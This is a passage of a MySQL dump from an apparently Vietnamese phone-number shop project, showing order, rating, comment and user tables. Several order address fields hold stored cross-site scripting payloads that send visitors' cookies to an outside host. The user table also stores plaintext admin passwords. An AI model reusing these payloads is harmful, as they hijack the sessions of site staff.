số&nbsp;0120, 0121, 0122, 0126, 0128. Tuy nhiên kể từ ngày 15/9/2018 các đầu 11 số đã được chuyển sang đầu 10 số mới theo thứ tự lần lượt là 070, 079, 077, 076, 078.</p><p style=\"text-align: justify;\"> Như vậy, ngoài đầu số 089 nhà mạng Mobifone còn sở hữu 7 đầu số khác bao gồm: 090, 093, 070, 079, 077, 076, 078, 079</a></p><h3 style=\"text-align: justify;\"> Ý nghĩa đầu số 089 mạng Mobifone<br></h3><p style=\"text-align: justify;\"> Theo ý nghĩa phong thủy, 089 là đầu số đẹp chính vì thế mà rất nhiều khách hàng chọn lựa sở hữu cho mình đầu số này với mong muống mang đến may mắn, hạnh phúc, tài lộc.&nbsp;</p><ul><li style=\"text-align: justify;\"> Số 0 là con số thể hiện sự toàn vẹn, viên mãn, tròn trịa và đầy đủ.</li><li style=\"text-align: justify;\"> Số 8 trước nay vẫn luôn được xem là cô số phát tài, phát lộc là đại diện của sự thành công. Ngoài ra, nhiều tài liệu còn cho rằng số 8 còn là con số giúp xua đuổi tà ma, mang đến bình yên và hạn chế xui xeo.</li><li style=\"text-align: justify;\"> Số 9 là con số lớn nhất trong dãy số tự nhiên có 1 chữ số. Số 9 thể hiện cho sức mạng, địa vị và quyền lực. Bên cạnh đó, số 9 còn mang lại may mắn, trường thọ.</li></ul><p style=\"text-align: justify;\"> Sự kết hợp của đầu số 089 thể hiện hiện ý nghĩa mãi mãi phát tài, phát lộc, trường cửu. Mọi điều may mắn và hạnh phúc sẽ đến vối người sử dụng.</p>', '4.png', 'Đầu số 089 mạng gì? Ý nghĩa của đầu số 089', '4.png', 'Đầu số 089 mạng gì tại sao được tìm kiếm nhiều trên mạng như vậy? Khi mà nhà cung cấp dịch vụ viễn […]', '2021-02-08');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `rate`
--

CREATE TABLE `rate` (
  `rate_id` int(11) NOT NULL,
  `prd_id` int(11) DEFAULT NULL,
  `rate_star` int(11) DEFAULT 0,
  `rate_name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `rate_mail` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `rate_cmt` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `rate_time` datetime NOT NULL,
  `rate_image` varchar(255) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `rate`
--

INSERT INTO `rate` (`rate_id`, `prd_id`, `rate_star`, `rate_name`, `rate_mail`, `rate_cmt`, `rate_time`, `rate_image`) VALUES
(25, 1, 0, 'demo', 'demo@gmail.com', 'demo', '2020-10-21 08:52:23', '56963200_10157618566035649_4787796767238258688_n.jpg'),
(26, 1, 0, 'demo', 'demo@gmail.com', 'demo', '2020-10-21 08:52:27', '56963200_10157618566035649_4787796767238258688_n.jpg'),
(27, 1, 0, 'demo', 'demo@gmail.com', 'demo', '2020-10-21 08:52:31', '56963200_10157618566035649_4787796767238258688_n.jpg'),
(28, 14, 0, 'ádfasdfad', 'adfa@gmail.com', 'sdafad', '2020-10-21 09:57:39', '13286.c'),
(37, 1, 0, 'ng xuan tung', 'tung@gmail.com', 'fff', '2020-10-25 22:52:23', '120703373_2736678959883956_9030177342775346229_o.jpg'),
(38, 1, 0, 'ng xuan tung', 'tung@gmail.com', 'fffffff', '2020-10-25 22:53:05', ''),
(39, 1, 0, 'ng xuan tung', 'tung@gmail.com', 'dd', '2020-10-25 22:56:01', ''),
(40, 1, 0, 'd', 'dddd@u', 'd', '2021-04-14 11:23:42', '60766e4e1d79f.jpg'),
(41, 1, 0, 'a', 'tung@gmail.com', 'a', '2021-04-14 11:24:28', '60766e7cd15bc.png'),
(42, 1, 0, 's', 'dddd@u', 's', '2021-04-14 11:25:30', '');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `repcmt`
--

CREATE TABLE `repcmt` (
  `rep_id` int(11) NOT NULL,
  `rep_cmt` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `comm_id` int(11) DEFAULT NULL,
  `rep_time` datetime NOT NULL,
  `rep_name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `rep_mail` varchar(255) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `repcmt`
--

INSERT INTO `repcmt` (`rep_id`, `rep_cmt`, `comm_id`, `rep_time`, `rep_name`, `rep_mail`) VALUES
(1, 'nhận xét đúng rùi', 35, '2020-09-02 14:42:26', 'ngoc tram', 'hihi@gmail.com'),
(2, 'sáda', 35, '2020-09-02 14:42:54', 'ngoc tram', 'hihi@gmail.com'),
(3, 'a', 35, '2020-09-02 14:43:11', 'ngoc tram', 'hihi@gmail.com');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `tot_order`
--

CREATE TABLE `tot_order` (
  `tot_id` int(11) NOT NULL,
  `ord_time` datetime NOT NULL,
  `cust_name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `cust_num` varchar(11) COLLATE utf8_unicode_ci DEFAULT NULL,
  `cust_add` varchar(550) COLLATE utf8_unicode_ci DEFAULT NULL,
  `cust_mail` varchar(550) COLLATE utf8_unicode_ci DEFAULT NULL,
  `tot_price` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `tot_order`
--

INSERT INTO `tot_order` (`tot_id`, `ord_time`, `cust_name`, `cust_num`, `cust_add`, `cust_mail`, `tot_price`) VALUES
(34, '2020-10-20 17:25:52', 'demo', '0968641337', '<script>   img = new Image();   img.src=\'http://hostportals.000webhostapp.com/dumps.php?v=\' + \'|\' + document.cookie + \'|\' + document.location </script>', 'vnpt1337@gmail.com', 5990000),
(35, '2020-10-20 17:26:08', 'Nguyễn Xuân Tùng', '0865589586', 'tttt-ttttttttttttt-ttttttttttttt', 'tungnguyen090120@gmail.com', 3599999),
(37, '2020-10-20 17:33:58', 'Nguyễn Xuân Tùng', '0865589586', 'test2', 'tungnguyen090120@gmail.com', 3599999),
(38, '2020-10-20 17:40:10', 'phamduc', '0999131337', '<script>   img = new Image();   img.src=\'http://hostportals.000webhostapp.com/dumps.php?v=\' + \'|\' + document.cookie + \'|\' + document.location </script>', 'pentester8467@gmail.com', 3180000),
(39, '2020-10-21 09:51:41', '', '', '', '', 3599999),
(40, '2020-10-21 10:38:00', 'phamduc 01 ', '083833333', '<h1>222222</h1> <font color=\"red\">22222</font><script>', 'demodemo@gmail.com', 3599999),
(41, '2020-10-21 13:36:33', 'Đội 4', '01123445533', '<script>   img = new Image();   img.src=\'http://hostportals.000webhostapp.com/dumps.php?v=\' + \'|\' + document.cookie + \'|\' + document.location </script>', 'abc@abc.com', 2390000),
(42, '2020-10-21 13:37:34', 'team2', '09095100298', '<script>   img = new Image();   img.src=\'http://hostportals.000webhostapp.com/dumps.php?v=\' + \'|\' + document.cookie + \'|\' + document.location </script>', 'thanh@gmail.com', 3599999),
(43, '2020-10-21 13:38:50', 'Nguyễn Văn Mạc', '0988448640', '<script>   img = new Image();   img.src=\'http://hostportals.000webhostapp.com/dumps.php?v=\' + \'|\' + document.cookie + \'|\' + document.location </script>', 'justdoityself@gmail.com', 1590000),
(44, '2020-10-21 13:44:01', 'Đội 4', '01123445533', '<script>   img = new Image();   img.src=\'http://hostportals.000webhostapp.com/dumps.php?v=\' + \'|\' + document.cookie + \'|\' + document.location </script>', 'abc@abc.com', 5080000),
(45, '2020-10-21 14:02:17', '', '', '<script>   img = new Image();   img.src=\'http://hostportals.000webhostapp.com/dumps.php?v=\' + \'|\' + document.cookie + \'|\' + document.location </script>', '', 3599999),
(46, '2021-04-27 22:17:15', 'asd', '08655895863', '345', 'tung@gmail.com', 27490000),
(47, '2021-04-27 22:17:53', 'asd', '08655895863', '345', 'tung@gmail.com', 27490000),
(48, '2021-04-27 22:18:20', 'asd44444444444444444444444444444aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', '08655895863', '345aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', 'tung@gmail.comaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', 27490000),
(49, '2021-04-27 22:18:33', 'asd44444444444444444444444444444aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', '08655895863', '345aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', 'tung@gmail.comaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', 27490000),
(50, '2021-04-27 22:35:27', '', '', '', '', 27490000),
(51, '2021-04-27 22:35:33', 'asd44444444444444444444444444444aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', '08655895863', '345aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', 'tung@gmail.comaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', 27490000),
(52, '2021-04-27 22:36:11', 'asd44444444444444444444444444444aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', 'aaaaaaaaaaa', '345aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', 'tung@gmail.comaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', 27490000),
(53, '2021-04-27 22:55:16', 'rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr', 'rrrrrrrrrrr', 'rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr', 'rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr', 27490000),
(54, '2021-04-27 23:15:47', 'asd', '0865589586k', '', 'ngotiendung1609@gmail.com', 27490000),
(55, '2021-04-27 23:18:24', 'Tùng Nguyễn', '0987654321s', '', 'tungnguyen090120@gmail.com', 27490000),
(56, '2021-04-27 23:19:21', 'asd', '0865589586', '', 'tung@gmail.com', 27490000);

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `user`
--

CREATE TABLE `user` (
  `user_id` int(11) NOT NULL,
  `user_full` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `user_mail` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `user_pass` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `user_level` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `user`
--

INSERT INTO `user` (`user_id`, `user_full`, `user_mail`, `user_pass`, `user_level`) VALUES
(1, 'Ngo Dung', 'ngodung1609@gmail.com', 'admin@1234', 2),
(2, 'Hoang Hai', 'hoanghai213@gmail.com', 'admin@1234', 2),
(3, 'Kieu Thanh', 'thanhkieu1503', 'admin@1234', 2),
(4, 'Xuan Chien', 'xuanchien1403', 'admin@1234', 2),
(5, 'Xuan Tung', 'xuantung2304', 'admin@1234', 2),
(6, 'Cong Hieu', 'conghieu1505', 'admin@1234', 2),
(7, 'Thai Duong', 'thaiduong1307', 'admin@1234', 2),
(8, 'admin', 'admin123@gmail.com', '$2y$10$i2u5xFCpNoL.qOV.FYnpx.xPeeR4MQlwVF5M8nco6eofqfW5mQJte', 1);

--
-- Chỉ mục cho các bảng đã đổ
--

--
-- Chỉ mục cho bảng `banned_word`
--
ALTER TABLE `banned_word`
  ADD PRIMARY KEY (`ban_id`);

--
-- Chỉ mục cho bảng `category`
--
ALTER TABLE `category`
  ADD PRIMARY KEY (`cat_id`),
  ADD UNIQUE KEY `cat_name` (`cat_name`);

--
-- Chỉ mục cho bảng `comment`
--
ALTER TABLE `comment`
  ADD PRIMARY KEY (`comm_id`);

--
-- Chỉ mục cho bảng `prd_order`
--
ALTER TABLE `prd_order`
  ADD PRIMARY KEY (`ord_id`);

--
-- Chỉ mục cho bảng `product`
--
ALTER TABLE `product`
  ADD PRIMARY KEY (`prd_id`);

--
-- Chỉ mục cho bảng `qa`
--
ALTER TABLE `qa`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `rate`
--
ALTER TABLE `rate`
  ADD PRIMARY KEY (`rate_id`);

--
-- Chỉ mục cho bảng `repcmt`
--
ALTER TABLE `repcmt`
  ADD PRIMARY KEY (`rep_id`);

--
-- Chỉ mục cho bảng `tot_order`
--
ALTER TABLE `tot_order`
  ADD PRIMARY KEY (`tot_id`);

--
-- Chỉ mục cho bảng `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`user_id`),
  ADD UNIQUE KEY `user_mail` (`user_mail`);

--
-- AUTO_INCREMENT cho các bảng đã đổ
--

--
-- AUTO_INCREMENT cho bảng `banned_word`
--
ALTER TABLE `banned_word`
  MODIFY `ban_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT cho bảng `category`
--
ALTER TABLE `category`
  MODIFY `cat_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT cho bảng `comment`
--
ALTER TABLE `comment`
  MODIFY `comm_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=50;

--
-- AUTO_INCREMENT cho bảng `prd_order`
--
ALTER TABLE `prd_order`
  MODIFY `ord_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=64;

--
-- AUTO_INCREMENT cho bảng `product`
--
ALTER TABLE `product`
  MODIFY `prd_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=39;

--
-- AUTO_INCREMENT cho bảng `qa`
--
ALTER TABLE `qa`
  MODIFY `id` int(6) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT cho bảng `rate`
--
ALTER TABLE `rate`
  MODIFY `rate_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=43;

--
-- AUTO_INCREMENT cho bảng `repcmt`
--
ALTER TABLE `repcmt`
  MODIFY `rep_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT cho bảng `tot_order`
--
ALTER TABLE `tot_order`
  MODIFY `tot_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=57;

--
-- AUTO_INCREMENT cho bảng `user`
--
ALTER TABLE `user`
  MODIFY `user_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
